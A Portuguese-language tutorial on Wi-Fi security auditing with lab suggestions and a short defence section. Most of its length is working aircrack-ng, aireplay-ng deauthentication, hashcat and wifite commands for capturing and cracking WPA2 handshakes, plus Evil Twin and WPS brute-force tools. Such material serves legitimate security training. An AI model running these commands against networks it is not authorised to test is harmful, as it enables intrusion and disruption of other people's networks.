# 📶 Segurança Wireless

> Auditoria de redes Wi-Fi: WPA/WPA2, WPA3, Evil Twin, deauth.

---

## 🛠️ Instalação

```bash
sudo apt install -y aircrack-ng kismet wifite
```

---

## 🚀 Passo a Passo

### Pré-requisito: placa em modo monitor
```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
# Verificar:
iwconfig
```

### Passo 1: Descobrir redes (Kismet / airodump)
```bash
sudo apt install -y aircrack-ng kismet
sudo airodump-ng wlan0

# Filtrar por canal e BSSID:
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0
```

### Passo 2: Capturar handshake WPA2
```bash
# Em outro terminal, forçar deauth (apenas em lab):
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0
# Aguardar "WPA handshake" no airodump

# Verificar:
aircrack-ng captura-01.cap
```

### Passo 3: Quebrar senha
```bash
# Wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap

# Com hashcat (mais rápido GPU):
hcxpcapngtool -o hash.hc22000 captura-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt
```

### Passo 4: Wifite (automático)
```bash
sudo apt install -y wifite
sudo wifite --kill
```

---

## Ferramentas

| Ferramenta | Uso |
|:---|:---|
| **aircrack-ng** | Captura e quebra WPA |
| **kismet** | Detector IDS wireless |
| **wifite** | Automação de ataques |
| **hostapd + dnsmasq** | Criar Evil Twin / Rogue AP |
| **reaver / bully** | WPS brute force (antigo) |

## Defesas (Blue)

- WPA3, PMF, desativar WPS, 802.1X (Enterprise)
- Detectar deauth com `kismet` + WIDS

---

## 🧪 Labs Práticos

### TryHackMe
- **[Wi-Fi Hacking](https://tryhackme.com/room/wifihacking101)** — Fundamentos de auditoria wireless
- **[WPA2 Cracking](https://tryhackme.com/room/aircrack-ng)** — Captura e quebra de handshake WPA2

### HackTheBox
- **[Wireless Challenges](https://app.hackthebox.com/challenges/wireless)** — Desafios de rede wireless

### Exercícios Locais
```bash
# Listar redes com airodump-ng
sudo airodump-ng wlan0mon

# Capturar handshake em rede de teste (AP próprio)
sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w lab_capture wlan0mon

# Forçar deauth (apenas em AP próprio/lab)
sudo aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon

# Quebrar com rockyou.txt
aircrack-ng -w /usr/share/wordlists/rockyou.txt lab_capture-01.cap

# Usar Wifite para automação
sudo wifite --kill --wpa --dict /usr/share/wordlists/rockyou.txt
```

### Desafio Integrado
1. Configure um AP com WPA2 (hostapd) como target
2. Capture handshake com airodump-ng + deauth
3. Quebre a senha com aircrack-ng
4. Documente tempo e método utilizado

> **ATENÇÃO:** Pratique apenas em redes próprias ou em lab isolado. Sniffing em redes alheias é crime (Art. 154-A do Código Penal).
